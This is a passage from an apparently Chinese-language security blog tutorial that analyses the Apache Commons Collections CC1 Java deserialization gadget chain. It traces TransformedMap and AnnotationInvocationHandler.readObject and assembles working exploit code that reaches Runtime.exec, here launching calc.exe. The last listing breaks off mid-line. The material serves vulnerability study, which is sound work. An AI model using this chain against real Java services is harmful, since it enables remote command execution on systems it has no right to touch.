<p><code>decorate()</code>方法是返回类实例，因为该类构造方法为<code>protect</code>修饰。第二个参数和第三个参数为<code>key</code>和<code>value</code>的修饰器。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当调用<code>put()</code>方法时，会对传入的<code>key</code>和<code>value</code>，分别使用各自的修饰器进行修饰。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">    key = <span class="built_in">this</span>.transformKey(key);</span><br><span class="line">    value = <span class="built_in">this</span>.transformValue(value);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.getMap().put(key, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">transformKey</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.keyTransformer == <span class="literal">null</span> ? object : <span class="built_in">this</span>.keyTransformer.transform(object);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">transformValue</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer == <span class="literal">null</span> ? object : <span class="built_in">this</span>.valueTransformer.transform(object);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>举个例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Map&lt;String,String&gt; map=new HashMap&lt;&gt;();</span><br><span class="line">        Map transformedMap=TransformedMap.decorate(map, new Transformer() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public Object transform(Object o) &#123;</span><br><span class="line">                return o.toString().toUpperCase();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, new Transformer() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public Object transform(Object o) &#123;</span><br><span class="line">                return o.toString().toUpperCase();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        transformedMap.put(&quot;key&quot;,&quot;value&quot;);</span><br><span class="line">        System.out.println(transformedMap.get(&quot;KEY&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，创建<code>TransformedMap</code>对<code>HashMap</code>进行修饰。在调用<code>decorate()</code>方法时，<code>key</code>修饰器和<code>value</code>修饰器均使用匿名类的方法创建。</p>
<p>当执行<code>put()</code>方法时，会将传入的<code>key</code>和<code>value</code>分别放入各自的修饰器中做大写处理。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230709205652609.png"
                      alt="image-20230709205652609"
                ></p>
<p>认识完各个类，我们将上面的代码逻辑捋一下：</p>
<ol>
<li>当执行<code>outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);</code>时，<code>test</code>和<code>xxxx</code>会分别调用<code>keyTransformer</code>和<code>valueTransformer</code>的<code>transform()</code>进行修饰</li>
<li><code>Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);</code>这里可以看到<code>valueTransformer</code>为<code>transformerChain</code></li>
<li><code>transformerChain</code>的<code>transform()</code>方法将<code>xxxx</code>按顺序给<code>ConstantTransformer</code>和<code>InvokerTransformer</code>的<code>transform()</code>方法执行</li>
<li><code>ConstantTransformer</code>的<code>transform()</code>返回<code>Runtime</code>实例化对象</li>
<li><code>InvokerTransformer</code>的<code>transform()</code>利用反射机制，执行<code>Runtime</code>对象的<code>exec</code>方法来实现命令执行</li>
</ol>
<h2 id="构造CommonsCollections1"><a href="#构造CommonsCollections1" class="headerlink" title="构造CommonsCollections1"></a>构造CommonsCollections1</h2><p>前面代码的核心便是<code>outerMap.put(&quot;test&quot;, &quot;xxxx&quot;)</code>，只有执行该操作时才可以调用整个链。因此如果想在反序列化时使用CC1，需要寻找一个类，该类的<code>readObject()</code>方法存在<code>TransformedMap.put()</code>或与其类似的操作。这里与其类似的操作是指什么呢？我们可以看一下<code>TransformedMap</code>中，是否存在其他方法调用了<code>keyTransformer</code>或<code>valueTransformer</code>？这里找到了<code>checkSetValue</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了反序列化时实现CC1，我们引入一个新的类<code>AnnotationInvocationHandler</code></p>
<h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><p><code>sun.reflect.annotation.AnnotationInvocationHandler</code>该类为JDK内置类，且并未使用public进行修饰，因此仅能利用反射机制来使用该类。</p>
<p>需要注意的是JDK版本应小于8u71，8u71之后对该类做了一些修改，这里使用的是JDK8u66.</p>
<p><code>readObject()</code>代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    var1.defaultReadObject();</span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br><span class="line">    <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">        Map.<span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Map.Entry)var4.next();</span><br><span class="line">        <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">        <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先来看一下这段代码主要干了什么。</p>
<p>代码中的<code>this.type</code>和<code>this.memberValues</code>可以看一下构造函数。<code>type</code>为继承了<code>Annotation</code>类的类对象，<code>memberValue</code>为传进来的<code>Map</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    Class[] var3 = var1.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;</span><br><span class="line">        <span class="built_in">this</span>.type = var1;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = var2;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>var2 = AnnotationType.getInstance(this.type)</code>用于获取注解类型的 <code>AnnotationType</code> 对象。<code>AnnotationType</code> 是 Java 反射 API 中的一个类，它代表了一个注解类型的元数据信息。通过 <code>AnnotationType</code> 对象，可以获取注解类型的名称、成员方法、默认值等相关信息。</p>
<p><code>Map var3 = var2.memberTypes();</code>用来获取注解类中的成员对象，成员对象名为<code>key</code>，成员类型为<code>value</code></p>
<p>举例如下：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230710151851534.png"
                      alt="image-20230710151851534"
                ></p>
<p>上述代码存在注解类<code>MyAnnotation</code>，通过<code>AnnotationType.getInstance(MyAnnotation.class)</code>拿到了<code>AnnotationType</code>类。再通过<code>AnnotationType.memberTypes()</code>拿到了注解类中的成员对象，这里返回的是<code>Map</code>，成员对象名为<code>key</code>，成员类型为<code>value</code>。放到<code>readObject()</code>方法里，便是获取传递进来的第一个参数对应的注释解的成员变量。</p>
<p><code>Iterator var4 = this.memberValues.entrySet().iterator()</code>前面我们提到<code>this.memberValues</code>为传递进来的<code>Map</code>。<code>Map.entrySet().iterator()</code> 是一个方法调用序列，用于获取映射的键值对视图的迭代器。通过调用 <code>entrySet()</code> 方法获取键值对视图，然后使用 <code>iterator()</code> 方法获取迭代器，我们可以对键值对进行迭代和访问。举例如下：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230710152703504.png"
                      alt="image-20230710152703504"
                ></p>
<p>放到<code>readObject()</code>里，便是通过迭代访问传递进来的第二个参数<code>Map</code>的<code>key</code>和<code>value</code></p>
<p>最后再看代码中的<code>while</code>循环（<code>var3</code>和<code>var5</code>是两个不同的<code>Map</code>，一个为注解类成员变量<code>Map</code>，一个为传递进来的参数<code>Map</code>）:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">    Map.<span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Map.Entry)var4.next();</span><br><span class="line">    <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">    <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">        <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">            var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>String var6 = (String)var5.getKey()</code>：从传递进来的参数<code>Map</code>中获取<code>key</code></li>
<li><code> Class var7 = (Class)var3.get(var6)</code>：从注解类成员变量<code>Map</code>中获取<code>key</code>对应值的类型</li>
<li><code> if (var7 != null)</code>：若<code>key</code>对应的值的类型不为空，则代表<code>key</code>是注解类的成员变量</li>
<li><code> Object var8 = var5.getValue()</code>：从传递进来的参数<code>Map</code>中获取<code>value</code></li>
<li><code>!var7.isInstance(var8)</code>若<code>value</code>的类型和从注解<code>Map</code>中获取的类型不相同，则对传进来的参数<code>Map</code>重新赋值</li>
</ul>
<p><code>setValue(...)</code>是这段代码的核心。当<code>AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2)</code>构造方法第二个参数为<code>TransformedMap</code>时，<code>var5.setValue()</code>会调用<code>TransformedMap.chechSetValue()</code>方法。我们来捋一下这个调用的过程。</p>
<ol>
<li>我们在构造方法中传递进来的第二个参数为<code>TransformedMap</code>，此时<code>this.memberValues</code>为<code>TransformedMap</code></li>
<li><code>Iterator var4 = this.memberValues.entrySet().iterator();</code>此处先调用<code>entrySet()</code>方法，但是<code>TransformedMap</code>并没有该方法，因此调用的是其父类<code>AbstractInputCheckedMapDecorator</code>的<code>entrySet()</code></li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">isSetValueChecking</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Set <span class="title function_">entrySet</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (Set)(<span class="built_in">this</span>.isSetValueChecking() ? <span class="keyword">new</span> <span class="title class_">EntrySet</span>(<span class="built_in">super</span>.map.entrySet(), <span class="built_in">this</span>) : <span class="built_in">super</span>.map.entrySet());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里实际上执行的是<code>new EntrySet(super.map.entrySet(), this)</code>，<code>EntrySet()</code>为<code>AbstractInputCheckedMapDecorator</code>的内置类。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230710211517605.png"
                      alt="image-20230710211517605"
                ></p>
<p>构造方法是执行了<code>EntrySet</code>父类的构造方法，并将自己的成员变量<code>parent</code>赋值为<code>AbstractInputCheckedMapDecorator</code>类。在往后我们先不分析。回到<code>this.memberValues.entrySet().iterator()</code>，<code>iterator()</code>为<code>EntrySet</code>下面的方法，返回了<code>EntrySetIterator</code>类。<img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230710212257626.png"
                      alt="image-20230710212257626"
                ></p>
<p><code>EntrySetIterator</code>同样是<code>AbstractInputCheckedMapDecorator</code>的内置类。构造方法也与<code>EntrySet</code>类似。该内置类的<code>parent</code>成员变量也是<code>AbstractInputCheckedMapDecorator</code><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230710212512546.png"
                      alt="image-20230710212512546"
                ></p>
<ol start="3">
<li><code>Map.Entry var5 = (Map.Entry)var4.next();</code>再往后看，这里的<code>next()</code>方法为<code>EntrySetIterator</code>类的<code>next()</code>方法</li>
</ol>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230710213828554.png"
                      alt="image-20230710213828554"
                ></p>
<p>返回的是<code>MapEntry</code>类，该类与同样是内置类。其他的与上面两个内置类相似</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230710214049981.png"
                      alt="image-20230710214049981"
                ></p>
<ol start="4">
<li><code>var5.setValue(...)</code>这里调用的是<code>MapEntry</code>的<code>setValue()</code>方法。</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    value = <span class="built_in">this</span>.parent.checkSetValue(value);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.entry.setValue(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里对<code>value</code>值做了处理，<code>this.parent</code>为<code>AbstractInputCheckedMapDecorator</code>。看一下<code>checkSetValue()</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">abstract</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object var1)</span>;</span><br></pre></td></tr></table></figure>

<p>发现这是一个抽象方法，没有具体的实现过程。但是在上面我们提到过<code>TransformedMap</code>中实现了该方法。因此这里实际调用的是<code>TransformedMap.checkSetValue</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>到这里我们就知道<code>readObject()</code>中<code>setValue()</code>是如何调用<code>TransformedMap.chechSetValue()</code>的了。</p>
<p>在反序列化时执行<code>AnnotationInvocationHandler.readObject()</code>再配合上我们精心构造的<code>Transformer</code>便可以进行命令执行。</p>
<h3 id="构造CommonsCollections1-1"><a href="#构造CommonsCollections1-1" class="headerlink" title="构造CommonsCollections1"></a>构造CommonsCollections1</h3><p>结合前面讲的内容，构造代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.AnnotatedElement;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建文件存储序列化数据</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;./a.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            file.createNewFile();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//创建输出流和输入流</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="comment">//构造CC链</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map innerMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map transformedMap=  TransformedMap.decorate(innerMap,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        <span class="comment">//通过反射获取AnnotationInvocationHandler类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> constructor.newInstance(Retention.class,transformedMap);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        Object o=objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行这段代码会发现报错</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230711200925934.png"
                      alt="image-20230711200925934"
                ></p>
<p>原因是<code>new ConstantTransformer(Runtime.getRuntime())</code>里的参数是<code>Runtime</code>实例，<code>Runtime</code>没有实现<code>Serializable</code>接口，因此不能反序列化。</p>
<p>解决方法就是将整个实例化的过程放到<code>ChainedTransformer.transform()</code>流程中，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这里传入的参数换成了<code>Runtime.class</code>，<code>Class</code>类有实现<code>Serializable</code>接口，因此可以序列化。</p>
<p>此时更改程序并执行，会发现经过反序列化之后并没有弹出计算器。并且查看源码会发现：<br><code>Object object = constructor.newInstance(Retention.class,transformedMap);</code>存在一个<code>Retention.class</code>类对象。解释一下为什么没有弹计算器，以及<code>Retention.class</code>是什么？</p>
<p><code>Retention</code>是Java中的注解类，其存在成员变量<code>RetentionPolicy value()</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230711205038014.png"
                      alt="image-20230711205038014"
                ></p>
<p>上面提到的流程里：从参数<code>Map</code>里取的<code>key</code>，同时出现在注解类成员变量<code>Map</code>里，并且注解类<code>Map</code>的类型与参数<code>Map</code>的类型不同时才会执行<code>setValue</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/assets/image-20230711205522653.png"
                      alt="image-20230711205522653"
                ></p>
<p>在我们的代码里，由注解类<code>Rentention</code>生成的<code>Map</code>为<code>&#123;value=class java.lang.annotation.RetentionPolicy&#125;</code>，而传进的参数<code>Map</code>并没有值，因此无法执行<code>setValue()</code>。为了执行<code>setValue()</code>，我们需要在<code>Map</code>中存入名为<code>value</code>的<code>key</code>，且对应的<code>value</code>类型不为<code>java.lang.annotation.RetentionPolicy</code></p>
<p>因此最终的CC1如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.AnnotatedElement;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建文件存储序列化数据</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;./a.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            file.createNewFile();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//创建输出流和输入流</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="comment">//构造CC链</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title 